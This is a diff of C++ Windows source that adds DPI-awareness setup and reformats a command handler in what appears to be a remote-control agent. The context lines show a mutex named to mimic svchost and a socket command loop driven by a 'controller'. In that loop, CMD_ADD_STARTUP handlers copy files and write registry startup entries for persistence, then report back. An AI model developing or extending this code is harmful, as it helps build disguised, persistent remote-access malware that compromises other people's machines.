@@ -4372,7 +4372,33 @@ static DWORD WINAPI Hb9003ThreadProc(LPVOID p)
     return 0;
 }
 
+// ===== 设置进程级DPI感知（必须在创建任何窗口前调用）=====
+static void SetDpiAwareness()
+{
+    // 1. Win10 1607+：Per-Monitor V2
+    HMODULE hUser32 = GetModuleHandleW(L"user32.dll");
+    if (hUser32) {
+        typedef BOOL(WINAPI* PFN_SetCtx)(HANDLE);
+        PFN_SetCtx p = (PFN_SetCtx)GetProcAddress(hUser32, "SetProcessDpiAwarenessContext");
+        if (p && p((HANDLE)-4)) return;   // -4 = DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2
+    }
+    // 2. Win8.1+：Per-Monitor V1（该API无V2）
+    HMODULE hShcore = LoadLibraryW(L"shcore.dll");
+    if (hShcore) {
+        typedef HRESULT(WINAPI* PFN_SetAware)(int);
+        PFN_SetAware p = (PFN_SetAware)GetProcAddress(hShcore, "SetProcessDpiAwareness");
+        if (p) { p(2); FreeLibrary(hShcore); return; }  // 2 = PROCESS_PER_MONITOR_DPI_AWARE（V1）
+        FreeLibrary(hShcore);
+    }
+    // 3. Vista+：System DPI Aware（最终兜底）
+    SetProcessDPIAware();
+}
+
+
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+
+    SetDpiAwareness();   // ★ 必须在任何窗口/DPI相关操作前设置
+
     // ===== 单实例检测 =====
     HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\SvchostAgentMutex_UniqueKey");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
@@ -5006,16 +5032,16 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                     }
 
                     else if (cmd == CMD_ADD_STARTUP) {
-                    HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
-                        SOCKET* ps = (SOCKET*)p;
-                        string result = ModifyStartup(*ps, true, true);  // 复制文件+写注册表
-                        SendPacketSafe(*ps, CMD_ADD_STARTUP_RES,
-                            vector<char>(result.begin(), result.end()));
-                        delete ps;
-                        return 0;
-                        }, new SOCKET(cs), 0, NULL);
-                    if (hThread) CloseHandle(hThread);
-}
+                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
+                            SOCKET* ps = (SOCKET*)p;
+                            string result = ModifyStartup(*ps, true, true);  // 复制文件+写注册表
+                            SendPacketSafe(*ps, CMD_ADD_STARTUP_RES,
+                                vector<char>(result.begin(), result.end()));
+                            delete ps;
+                            return 0;
+                            }, new SOCKET(cs), 0, NULL);
+                        if (hThread) CloseHandle(hThread);
+                    }
                     else if (cmd == CMD_ADD_STARTUP_NOREG) {
                         // 完整版模式：从控制端传来的路径复制文件+写注册表
                         struct Param { SOCKET sock; string srcPath; };
